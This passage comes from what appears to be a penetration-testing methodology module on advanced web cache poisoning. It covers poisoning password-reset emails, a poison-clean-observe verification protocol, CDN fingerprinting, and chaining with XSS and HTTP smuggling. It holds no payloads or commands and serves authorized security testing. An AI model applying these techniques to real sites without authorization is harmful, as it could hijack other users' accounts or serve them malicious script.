- Where cache-poisoned: subsequent reset emails for OTHER users receive the attacker's URL
- Where non-cached: route to `header_injection` for the per-victim Host-header exploitation primitive

## Verification Discipline

- Every finding passes the three-step protocol: poison → clean (different network/browser) → observe with cache-hit evidence
- Record the exact unkeyed input: header name + value, OR query/path/body component
- Fingerprint the cache layer explicitly: Cloudflare vs Fastly vs Akamai vs CloudFront vs Varnish vs Nginx — the behavioral matrix is per-CDN
- CDN behavioral baselines (VU#335217, youst.in) are historical; verify the specific edge's current behavior rather than asserting from 2020 baseline
- Cache-poisoned XSS findings must capture the rendered DOM at a victim principal, not just the response bytes
- Cache-DoS findings must measure the cache TTL; a <5s TTL is a different impact tier than a 60-min cache
- Preserve the measurement script and the captured curl responses as engagement artifacts
- For chain findings, each hop reproduces independently; the chain's composite reproduction is verified end-to-end

## Summary

Advanced web cache poisoning is about where the cache key diverges from the origin's response composition — unkeyed-input discovery via systematic header probing, per-CDN behavioral depth across the major commercial edges with the Jan-2020 CERT/CC baseline framed as historical not current, cache-key confusion via URL normalization or case-sensitivity, and the chained exploitation with XSS and HTTP smuggling at the response-write side. The three-step confirmation protocol remains the gate; the per-CDN × per-header matrix is a historical baseline requiring fresh verification per deployment. For the CVE catalog (Next.js, ATS, framework-specific CVEs) with version metadata, load `web_cache_poisoning_novel_deep`.
